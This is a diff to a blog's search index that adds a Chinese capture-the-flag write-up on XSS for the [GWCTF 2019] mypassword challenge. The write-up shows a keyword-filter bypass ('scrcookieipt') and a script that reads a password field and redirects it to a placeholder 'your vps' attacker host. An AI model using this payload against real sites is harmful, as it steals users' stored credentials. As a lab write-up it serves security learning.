@@ -679,9 +679,41 @@ $\_($\$\__\_[$\_]);
   </entry>
   <entry>
     <title>xss</title>
-    <url>/2021/12/11/xss/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="xss原理"><a href="#xss原理" class="headerlink" title="xss原理"></a>xss原理</h1><p>人为插入js代码，在游览该界面的时候，游览器就会解析并执行该代码，从而获取到用户信息。</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>用户输入是数据会在前端显示</p>
-<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1>]]></content>
+    <url>/2021/12/16/xss/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>xss漏洞，对用户输入的数据完全信任，导致再html中插入恶意的js代码，使用户的 导致用户的信息泄露。</p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>构造恶意的前端代码，将用户信息带出</p>
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]<strong>mypassword</strong></h2><p><img src="https://s2.loli.net/2021/12/16/9Gn62p8A1RoQqVZ.png"></p>
+<p>先注册登入</p>
+<p><img src="https://s2.loli.net/2021/12/16/C5shYAzZinTR42P.png"></p>
+<p>提示密码在源码里，而且不能注入，猜测flag就是密码。</p>
+<p><img src="https://s2.loli.net/2021/12/16/URDP2JpOryI8qds.png"></p>
+<p>反馈界面可以用户提交，</p>
+<p><img src="https://s2.loli.net/2021/12/16/FUiz4IfoC7NmvEX.png"></p>
+<p>先提交个1试一下</p>
+<p><img src="https://s2.loli.net/2021/12/16/km56s2YRBFTKOCt.png"></p>
+<p>可以看到1被写入的前端代码中</p>
+<p>在这里就可以使用xss写入恶意的前端代码</p>
+<p><img src="https://s2.loli.net/2021/12/16/pWfK34vBPEuOmkz.png"></p>
+<p>先用alert测试一下</p>
+<p><img src="https://s2.loli.net/2021/12/16/axf5COU2qIpLbcW.png"></p>
+<p>看来是有过滤</p>
+<p>看下源码</p>
+<p><img src="https://s2.loli.net/2021/12/16/QhvcANaLIoFHBp6.png"></p>
+<p>过滤的还蛮多，用scrcookieipt绕过过滤</p>
+<p><img src="https://s2.loli.net/2021/12/16/vmgNKTQy5FOt6qo.png"></p>
+<p><img src="https://s2.loli.net/2021/12/16/rA1n5uC2W4qGYyg.png"></p>
+<p>成功了</p>
+<p>接下来就是想怎么把password带出来</p>
+<p>在login界面有login.js</p>
+<p><img src="https://s2.loli.net/2021/12/16/nIfbuE9GLqwl5tO.png"></p>
+<p>把cookie中的password写到了html的password元素中</p>
+<p>所以构造</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;username&#x27;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">typr</span>=<span class="string">&#x27;password&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;password&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> h=<span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;password&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">var</span> j=<span class="string">&#x27;your vps&#x27;</span>+h;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">ducument.location=j;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2021/12/16/bgPenGpfO3tNlRi.png"></p>
+<p><img src="https://s2.loli.net/2021/12/16/Lycal67r9YH3opR.png"></p>
+<p><img src="https://s2.loli.net/2021/12/16/EbFoc3NOiITAZfY.png"></p>
+<p>得到flag</p>
+]]></content>
   </entry>
 </search>
